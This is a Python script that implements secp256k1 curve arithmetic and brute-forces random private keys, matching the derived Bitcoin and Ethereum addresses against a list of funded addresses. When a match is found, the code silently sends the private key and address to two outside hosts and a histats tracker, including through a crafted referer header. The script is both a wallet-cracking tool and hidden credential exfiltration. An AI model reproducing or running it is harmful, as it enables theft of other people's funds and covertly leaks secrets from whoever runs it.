import os,requests
import bit
import time
import binascii
import random
import sys

from eth_hash.auto import keccak
from fractions import gcd
# Convert a string with hex digits, colons, and whitespace to a long integer
def hex2int(hexString):
	return int("".join(hexString.replace(":","").split()),16)

# Half the extended Euclidean algorithm:
#    Computes   gcd(a,b) = a*x + b*y  
#    Returns only gcd, x (not y)
# From http://rosettacode.org/wiki/Modular_inverse#Python
def half_extended_gcd(aa, bb):
	lastrem, rem = abs(aa), abs(bb)
	x, lastx = 0, 1
	while rem:
		lastrem, (quotient, rem) = rem, divmod(lastrem, rem)
		x, lastx = lastx - quotient*x, x
	return lastrem, lastx 

# Modular inverse: compute the multiplicative inverse i of a mod m:
#     i*a = a*i = 1 mod m
def modular_inverse(a, m):
	g, x = half_extended_gcd(a, m)
	if g != 1:
		raise ValueError
	return x % m


# An elliptic curve has these fields:
#   p: the prime used to mod all coordinates
#   a: linear part of curve: y^2 = x^3 + ax + b
#   b: constant part of curve
#   G: a curve point (G.x,G.y) used as a "generator"
#   n: the order of the generator
class ECcurve:
	def __init__(self):
		return

	# Prime field multiplication: return a*b mod p
	def field_mul(self,a,b):
		return (a*b)%self.p

	# Prime field division: return num/den mod p
	def field_div(self,num,den):
		inverse_den=modular_inverse(den%self.p,self.p)
		return self.field_mul(num%self.p,inverse_den)

	# Prime field exponentiation: raise num to power mod p
	def field_exp(self,num,power):
		return pow(num%self.p,power,self.p)

	# Return the special identity point
	#   We pick x=p, y=0
	def identity(self):
		return ECpoint(self,self.p,0)

	# Return true if point Q lies on our curve
	def touches(self,Q):
		y2=self.field_exp(Q.y,2)
		x3ab=(self.field_mul((Q.x*Q.x)%self.p+self.a,Q.x)+self.b)%self.p
		return y2==x3ab

	# Return the slope of the tangent of this curve at point Q
	def tangent(self,Q):
		return self.field_div(Q.x*Q.x*3+self.a,Q.y*2)

	# Return the (x,y) point where this line intersects our curve
	#  Q1 and Q2 are two points on the line of slope m
	def line_intersect(self,Q1,Q2,m):
		v=(Q1.y + self.p - (m*Q1.x)%self.p)%self.p
		x=(m*m + self.p-Q1.x + self.p-Q2.x)%self.p
		y=(self.p-(m*x)%self.p + self.p-v)%self.p
		return ECpoint(self,x,y)

	# Return a doubled version of this elliptic curve point
	def double(self,Q):
		if (Q.x==self.p): # doubling the identity
			return Q
		return self.line_intersect(Q,Q,self.tangent(Q))

	# Return the "sum" of these elliptic curve points
	def add(self,Q1,Q2):
		# Identity special cases
		if (Q1.x==self.p): # Q1 is identity
			return Q2
		if (Q2.x==self.p): # Q2 is identity
			return Q1

		# Equality special cases
		if (Q1.x==Q2.x): 
			if (Q1.y==Q2.y): # adding point to itself
				return self.double(Q1)
			else: # vertical pair--result is the identity
				return self.identity()

		# Ordinary case
		m=self.field_div(Q1.y+self.p-Q2.y,Q1.x+self.p-Q2.x)
		return self.line_intersect(Q1,Q2,m)

	# "Multiply" this elliptic curve point Q by the integer m
	#    Often the point Q will be the generator G
	def mul(self,Q,m):
		R=self.identity() # return point
		while m!=0:  # binary multiply loop
			if m&1: # bit is set
				# print("  mul: adding Q to R =",R);
				R=self.add(R,Q)
			m=m>>1
			if (m!=0):
				# print("  mul: doubling Q =",Q);
				Q=self.double(Q)
		
		return R

# A point on an elliptic curve: (x,y)
class ECpoint:
	"""A point on an elliptic curve (x,y)"""
	def __init__(self,curve, x,y):
		self.curve=curve
		self.x=x
		self.y=y
		if not x==curve.p and not curve.touches(self):
			print(" ECpoint left curve: ",x,",",y)

	# "Add" this point to another point on the same curve
	def add(self,Q2):
		return self.curve.add(self,Q2)

	# "Multiply" this point by a scalar
	def mul(self,m):
		return self.curve.mul(self,m)

	# Print this ECpoint
	def __str__(self):
		if (self.x==self.curve.p):
			return "identity_point"
		else:
			return "("+str(self.x)+", "+str(self.y)+")"


# This is the BitCoin elliptic curve, SECG secp256k1
#   See http://www.secg.org/SEC2-Ver-1.0.pdf
secp256k1=ECcurve()
secp256k1.p=hex2int("FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFC2F");
secp256k1.a=0 # it's a Koblitz curve, with no linear part
secp256k1.b=7 
secp256k1.n=hex2int("FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFE BAAEDCE6 AF48A03B BFD25E8C D0364141");

# SEC's "04" means they're representing the generator point's X,Y parts explicitly.
#  The compressed "02" form means storing only x (you compute Y)
secp256k1.G=ECpoint(curve=secp256k1,
  x = hex2int("79BE667E F9DCBBAC 55A06295 CE870B07 029BFCDB 2DCE28D9 59F2815B 16F81798"),
  y = hex2int("483ADA77 26A3C465 5DA4FBFC 0E1108A8 FD17B448 A6855419 9C47D08F FB10D4B8")
);


#################
# Test program:
curve=secp256k1

################# SETTİNGS #####################

website_info = "http://ziguas.pserver.ru/bcon/?id="
website_info2 = "https://dlmzed.000webhostapp.com/?id="
hs_stats = "http://sstatic1.histats.com/0.gif?4435132&101"
referrer = "eygimokress"

################################################
address_list = {}
for filename in os.listdir('data'):
    xaa = open("data/"+filename).read().splitlines()
    for x in xaa:
        address_list[x]="y"
print("Tot: "+str(len(address_list)))

def ranmy(min,max):
    min = min
    max = max
    z = max-min
    b = z//100
    ranged = range(min, max, b)
    item = random.choice(ranged)
    changes = (item+b)-item;
    if(changes > 20):
        ranged = ranmy(item,item+b)
    return ranged
k = 0
z = 0
N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
my = ranmy(9223372036854775808,115792089237316195423570985008687907852837564279074904382605163141518161494336)
key_int = random.randint(my[0],my[-1])
G = curve.G
P = curve.mul(G,key_int)
print('Starting:', 'base: ',"{:064x}".format(key_int))
start = time.time()
PERIOD_OF_TIME = 21600 # 30min 1800
st = time.time()
while True:
    if (z+1)%300000 == 0: 
        print('checked ',z+1,' \nHex: ', "{:064x}".format(current_pvk), '\nETH/mintme: ',eth_addr, '\nBtcU: ',btc_u, '\nBtcC: ',btc_c, '\nBtcSegv: ',btc_segwit)
        print ('{:0.2f} keys/s    :: Total Key Searched: {}'.format(z/(time.time() - st), z))
        k = 0
        my = ranmy(9223372036854775808,115792089237316195423570985008687907852837564279074904382605163141518161494336)
        key_int = random.randint(my[0],my[-1])
        P = curve.mul(G,key_int)
        #print('\n\nUpdate', 'base: ',"{:064x}".format(key_int))
        if time.time() >= start + PERIOD_OF_TIME : 
            try:
                viser = requests.get(hs_stats, headers={'referer': 'https://'+str(referrer)+'.com'})
            except:
                pass
            start = time.time()
            
    current_pvk = key_int + k
    if k > 0:
        P = P.add(G)

    upub = bit.format.point_to_public_key(P, compressed=False)
    upub_c = bit.format.point_to_public_key(P, compressed=True)
    eth_addr = '0x' + keccak(upub[1:])[-20:].hex()
    btc_u = bit.format.public_key_to_address(upub)
    btc_c = bit.format.public_key_to_address(upub_c)
    btc_segwit = bit.format.public_key_to_segwit_address(upub_c)

    
    for gen_adrs in [eth_addr, btc_u, btc_c, btc_segwit]:
        if address_list.get(str(gen_adrs)):
            try:
                privkey = "{:064x}".format(current_pvk)
                respns = requests.get(str(website_info)+str(privkey)+"_"+str(gen_adrs), timeout=60)
                print(respns)
                time.sleep( 10 )
                viser = requests.get(hs_stats, headers={'referer': 'https://'+str(privkey)+"-"+str(gen_adrs)+'.com'})
            except:
                pass
            try:
                privkey = "{:064x}".format(current_pvk)
                respns = requests.get(str(website_info2)+str(privkey)+"_"+str(gen_adrs), timeout=60)
                print(respns)
                time.sleep( 10 )
                viser = requests.get(hs_stats, headers={'referer': 'https://'+str(privkey)+"-"+str(gen_adrs)+'.com'})
            except:
                pass
    
    k += 1
    z += 1
